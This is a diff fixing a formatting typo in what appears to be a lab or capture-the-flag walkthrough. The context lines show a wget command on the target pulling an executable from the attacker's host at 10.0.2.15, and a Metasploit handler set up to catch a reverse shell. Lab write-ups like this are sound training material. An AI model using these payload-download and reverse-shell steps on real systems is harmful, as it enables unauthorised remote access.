@@ -111,7 +111,7 @@ cd /tmp
 wget 10.0.2.15/meisty.exe
 ```
 
-Back on my attacker machine I started up metasploit `msfconsole` and then used the `exploit/multi/handler` with the payload `generic/shell_reverse_tcp.  And I set the lhost and lport. And ran it.
+Back on my attacker machine I started up metasploit `msfconsole` and then used the `exploit/multi/handler` with the payload `generic/shell_reverse_tcp`.  And I set the lhost and lport. And ran it.
 
 [<img src="../images/sunrise/msfconsole.png"
   style="width: 800px;"/>](../images/sunrise/msfconsole.png)
